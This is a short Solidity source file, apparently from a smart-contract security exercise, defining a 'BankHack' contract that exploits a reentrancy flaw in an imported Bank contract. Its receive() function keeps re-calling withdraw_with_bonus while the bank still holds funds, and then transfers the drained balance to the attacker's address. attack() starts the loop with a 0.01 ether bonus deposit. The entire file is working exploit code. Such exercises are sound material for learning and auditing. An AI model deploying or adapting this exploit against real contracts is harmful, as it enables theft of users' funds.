// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Bank.sol";

contract BankHack {
    Bank bank;
    address payable bankAddress;
    address owner;

    constructor(address payable _bankAddress){
        bankAddress = _bankAddress;
        bank = Bank(_bankAddress);
        owner = msg.sender;
    }

    receive() external payable{
        if(address(bank).balance > 0){
            bank.withdraw_with_bonus();
        }else{
            // Get money out of contract to attacker's address
            payable(owner).transfer(address(this).balance);
        }
    }

    function prepareAttack() external payable{
         (bool success, bytes memory data) = bankAddress.call{value: msg.value}("");
    }

    function attack() external payable{
        require(msg.value == 0.01 ether, "require 0.01 ether to attack");
        bank.giveBonusToUser{value: 0.01 ether}(address(this));
        bank.withdraw_with_bonus();
    }
}